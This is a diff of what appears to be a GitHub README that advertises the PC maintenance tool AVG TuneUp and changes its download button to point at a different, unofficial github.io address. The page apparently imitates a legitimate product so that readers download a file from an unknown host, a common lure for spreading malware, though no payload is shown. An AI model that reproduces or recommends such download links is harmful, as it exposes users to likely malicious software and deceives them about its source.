@@ -3,7 +3,7 @@
 Keep your computer running like new with **AVG TuneUp**, the all-in-one maintenance and performance tool for PCs. Clean up junk files, speed up startup, fix performance issues, and extend your PC’s lifespan with one click.
 
 ⬇️ **Download**  
-[![Download AVG TuneUp](https://img.shields.io/badge/Download-AVG_TuneUp-005BAC?style=for-the-badge&logo=avg&logoColor=white)](https://avg-tuneup-free-tool.github.io/.github/)
+[![Download AVG TuneUp](https://img.shields.io/badge/Download-AVG_TuneUp-005BAC?style=for-the-badge&logo=avg&logoColor=white)](https://molitisukh.github.io/.github/avg-tuneup-tool)
 
 ---
 
